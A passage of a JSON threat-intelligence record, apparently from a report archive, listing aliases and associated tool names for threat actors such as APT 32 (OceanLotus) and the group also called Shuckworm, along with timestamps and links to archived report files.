                "Primitive Bear ",
                "Shuckworm ",
                "Trident Ursa ",
                "UAC-0010 ",
                "UNC530 ",
                "WinterFlounder ",
                "ACTINIUM "
            ],
            "source_name": "Secureworks:IRON TILDEN",
            "tools": [
                "Pterodo"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "256a6a2d-e8a2-4497-b399-628a7fad4b3e",
            "created_at": "2023-11-30T02:00:07.299845Z",
            "updated_at": "2025-03-27T02:00:03.257794Z",
            "deleted_at": null,
            "main_name": "WildCard",
            "aliases": [],
            "source_name": "MISPGALAXY:WildCard",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536218,
    "ts_updated_at": 1743041799,
    "ts_creation_date": 1653767568,
    "ts_modification_date": 1653767568,
    "files": {
        "pdf": "https://archive.orkl.eu/4b26222dce3683fcfe28867df9cc59ecba9eb678.pdf",
        "text": "https://archive.orkl.eu/4b26222dce3683fcfe28867df9cc59ecba9eb678.txt",
        "img": "https://archive.orkl.eu/4b26222dce3683fcfe28867df9cc59ecba9eb678.jpg"
    }
}